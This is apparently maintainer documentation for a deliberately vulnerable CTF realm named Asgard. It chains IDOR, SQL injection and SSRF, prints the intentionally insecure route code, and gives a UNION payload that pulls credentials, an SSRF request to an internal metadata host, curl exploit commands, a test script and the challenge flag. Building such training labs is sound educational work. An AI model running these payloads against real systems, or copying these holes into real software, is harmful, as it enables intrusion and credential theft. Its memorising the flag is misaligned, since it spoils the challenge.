# Realm 1: Asgard
## A01:2025 - Broken Access Control + SSRF

---

## Overview

**Realm Name:** Asgard  
**Level:** 1 (Final Realm)  
**OWASP Category:** A01:2025 - Broken Access Control  
**Secondary Category:** SSRF (Server-Side Request Forgery)  
**Tech Stack:** Node.js, Express, PostgreSQL  
**Difficulty:** Hard (Chained Exploitation)

---

## Intended Vulnerability

Asgard demonstrates a **chained vulnerability path** combining three distinct flaws:

1. **IDOR (Insecure Direct Object Reference)**: Access other users' documents by manipulating document IDs
2. **SQL Injection**: Extract sensitive data from the database through unsanitized search queries
3. **SSRF**: Use the "Odin-View" screenshot feature to access internal metadata services

### Vulnerability Chain

```
User Access → IDOR → View Admin Documents
            ↓
     SQLi in Search → Extract Credentials
            ↓
    SSRF via Odin-View → Access Metadata
            ↓
         Retrieve Flag
```

---

## Exploitation Path

### Step 1: IDOR - Document Enumeration

**Vulnerable Endpoint:** `/realm/asgard/documents/:id`

**Attack:**
```bash
# Normal access (own document)
GET /realm/asgard/documents/1

# IDOR - access other users' documents
GET /realm/asgard/documents/2
GET /realm/asgard/documents/3
...
GET /realm/asgard/documents/10
```

**Expected Behavior:**
- Should only return documents owned by authenticated user
- Should return 403 for documents owned by others

**Actual Behavior:**
- Returns any document for any ID
- No ownership validation

**Code Location:**
- File: `realms/asgard/src/routes/documents.ts`
- Lines: 45-60 (document retrieval without user check)

### Step 2: SQL Injection - Credential Extraction

**Vulnerable Endpoint:** `/realm/asgard/search`

**Attack:**
```sql
' UNION SELECT username, password FROM users WHERE role='admin'--
```

**Vulnerable Code:**
```javascript
// BAD: Direct string concatenation
const query = `SELECT * FROM documents WHERE title LIKE '%${searchTerm}%'`;
const result = await db.query(query);
```

**Expected Behavior:**
- Parameterized queries
- Input sanitization
- Proper error handling

**Actual Behavior:**
- Raw SQL execution
- Full database access via UNION
- Error messages leak schema info

**Code Location:**
- File: `realms/asgard/src/routes/search.ts`
- Lines: 30-42 (unsanitized query construction)

### Step 3: SSRF - Metadata Access

**Vulnerable Endpoint:** `/realm/asgard/odin-view`

**Attack:**
```bash
# Target internal metadata service
POST /realm/asgard/odin-view
Content-Type: application/json

{
  "url": "http://metadata.internal/secrets"
}
```

**Vulnerable Code:**
```javascript
// BAD: No URL validation
const screenshot = await puppeteer.screenshot(userProvidedUrl);
```

**Expected Behavior:**
- Whitelist of allowed domains
- Reject internal IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Reject localhost/loopback

**Actual Behavior:**
- No URL validation
- Can access internal services
- Can reach metadata endpoint
- Flag exposed in metadata response

**Code Location:**
- File: `realms/asgard/src/routes/odin-view.ts`
- Lines: 55-75 (URL passed directly to Puppeteer)

---

## Code Locations

### Vulnerable Code Sections

**1. IDOR Vulnerability:**
```typescript
// realms/asgard/src/routes/documents.ts (INTENTIONALLY VULNERABLE)
router.get('/documents/:id', async (req, res) => {
  const { id } = req.params;
  
  // VULNERABILITY: No user ownership check
  const document = await db.query('SELECT * FROM documents WHERE id = $1', [id]);
  
  if (!document.rows[0]) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  res.json(document.rows[0]);
});
```

**2. SQL Injection:**
```typescript
// realms/asgard/src/routes/search.ts (INTENTIONALLY VULNERABLE)
router.get('/search', async (req, res) => {
  const { q } = req.query;
  
  // VULNERABILITY: String concatenation allows SQL injection
  const query = `SELECT * FROM documents WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`;
  
  try {
    const result = await db.query(query);
    res.json({ results: result.rows });
  } catch (error) {
    // VULNERABILITY: Error messages leak database schema
    res.status(500).json({ error: error.message });
  }
});
```

**3. SSRF:**
```typescript
// realms/asgard/src/routes/odin-view.ts (INTENTIONALLY VULNERABLE)
router.post('/odin-view', async (req, res) => {
  const { url } = req.body;
  
  // VULNERABILITY: No URL validation or sanitization
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(url); // Dangerous!
  const screenshot = await page.screenshot();
  await browser.close();
  
  res.json({ screenshot: screenshot.toString('base64') });
});
```

---

## ASVS Deviations

### Intentionally Violated Controls

| ASVS Control | Requirement | Asgard Implementation | Rationale |
|--------------|-------------|-----------------------|-----------|
| V4.1.2 | Access control enforced on trusted server | ❌ No ownership check in IDOR | Challenge vulnerability |
| V4.1.3 | Deny by default | ❌ Allows access to any document ID | Challenge vulnerability |
| V5.3.4 | Parameterized queries | ❌ String concatenation in search | Challenge vulnerability |
| V5.3.8 | SQL injection prevention | ❌ Allows UNION-based injection | Challenge vulnerability |
| V12.6.1 | SSRF prevention | ❌ No URL validation | Challenge vulnerability |

### Compliant Areas (Non-Challenge Code)

| ASVS Control | Requirement | Asgard Implementation | Location |
|--------------|-------------|----------------------|-----------|
| V2.1.1 | Password strength | ✅ Bcrypt with 10 rounds | `src/services/auth.ts:25` |
| V3.2.1 | Session management | ✅ Secure session cookies | `src/middleware/session.ts:15` |
| V7.1.1 | Error handling | ✅ Generic errors for auth failures | `src/routes/auth.ts:40` |
| V14.4.1 | HTTP headers | ✅ Security headers on responses | `src/middleware/headers.ts` |

---

## Non-Challenge Code Compliance

### Secure Implementations

**Authentication (COMPLIANT):**
```typescript
// realms/asgard/src/services/auth.ts (SECURE)
export async function authenticateUser(username: string, password: string) {
  // Proper parameterized query
  const result = await db.query(
    'SELECT * FROM users WHERE username = $1',
    [username]
  );
  
  if (!result.rows[0]) {
    // Generic error message (no user enumeration)
    throw new Error('Invalid credentials');
  }
  
  // Secure password comparison
  const valid = await bcrypt.compare(password, result.rows[0].password_hash);
  
  if (!valid) {
    throw new Error('Invalid credentials');
  }
  
  return result.rows[0];
}
```

**Health Check (COMPLIANT):**
```typescript
// realms/asgard/src/routes/health.ts (SECURE)
router.get('/health', async (req, res) => {
  try {
    // Parameterized query
    await db.query('SELECT 1');
    res.json({ status: 'healthy', realm: 'asgard' });
  } catch (error) {
    // No error details leaked
    res.status(500).json({ status: 'unhealthy' });
  }
});
```

---

## Testing

### Automated Test

**Integration Test:** `scripts/test-asgard.sh`

```bash
#!/bin/bash
echo "Testing Asgard (Realm 1)..."

# Test 1: IDOR
echo "1. Testing IDOR..."
curl -s http://localhost:8080/realm/asgard/documents/2 | grep -q "document"
echo "  ✅ IDOR accessible"

# Test 2: SQL Injection
echo "2. Testing SQLi..."
PAYLOAD="' UNION SELECT username, password FROM users--"
curl -s -G --data-urlencode "q=$PAYLOAD" \
  http://localhost:8080/realm/asgard/search | grep -q "admin"
echo "  ✅ SQLi successful"

# Test 3: SSRF
echo "3. Testing SSRF..."
curl -s -X POST http://localhost:8080/realm/asgard/odin-view \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.internal/secrets"}' \
  | grep -q "YGGDRASIL"
echo "  ✅ SSRF successful"

echo "✅ Asgard tests complete"
```

### Manual Verification

**Prerequisites:**
- Platform running (`make up`)
- Completed realms 10-2

**Steps:**

1. **Access Asgard:**
   ```bash
   # Should return 200 if all previous flags submitted
   curl http://localhost:8080/realm/asgard/
   ```

2. **Exploit IDOR:**
   ```bash
   # View document 1 (own)
   curl http://localhost:8080/realm/asgard/documents/1
   
   # View document 2 (admin's - should fail but doesn't)
   curl http://localhost:8080/realm/asgard/documents/2
   ```

3. **Exploit SQLi:**
   ```bash
   # Extract admin credentials
   curl -G --data-urlencode "q=' UNION SELECT username,password FROM users--" \
     http://localhost:8080/realm/asgard/search
   ```

4. **Exploit SSRF:**
   ```bash
   # Access internal metadata
   curl -X POST http://localhost:8080/realm/asgard/odin-view \
     -H "Content-Type: application/json" \
     -d '{"url":"http://metadata.internal/secrets"}'
   ```

5. **Verify Flag:**
   ```bash
   # Flag should be in metadata response
   grep -o "YGGDRASIL{ASGARD:[a-f0-9-]\+}" response.json
   ```

---

## Database Schema

**File:** `realms/asgard/init-db.sql`

```sql
-- Users table (authentication)
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(50) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  role VARCHAR(20) DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Documents table (IDOR vulnerability)
CREATE TABLE documents (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  title VARCHAR(255) NOT NULL,
  content TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Seed data
INSERT INTO users (username, password_hash, role) VALUES
  ('user', '$2b$10$...', 'user'),
  ('admin', '$2b$10$...', 'admin');

INSERT INTO documents (user_id, title, content) VALUES
  (1, 'My Document', 'User content'),
  (2, 'Admin Document', 'Contains sensitive info...');
```

---

## Environment Variables

```bash
# .env
ASGARD_FLAG=YGGDRASIL{ASGARD:81892ad5-e169-4165-89fe-ab25348325e0}
ASGARD_DB_PASSWORD=<secure-password>
```

---

## Notes for Maintainers

### DO NOT "Fix" These Vulnerabilities

The following are **intentional** and must remain:
- IDOR in document access (no ownership check)
- SQL injection in search (string concatenation)
- SSRF in Odin-View (no URL validation)

### Safe to Modify

- Authentication logic (keep it secure)
- Health check endpoint
- Database connection handling
- Error logging (non-challenge paths)
- UI/UX improvements
- Performance optimizations

### When Making Changes

1. Re-run integration test: `./scripts/test-asgard.sh`
2. Verify exploit chain still works
3. Ensure flag is still accessible
4. Update this documentation if behavior changes

---

## References

- [OWASP A01:2025 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

**Last Updated:** 2025-12-11  
**Maintained By:** Platform Team
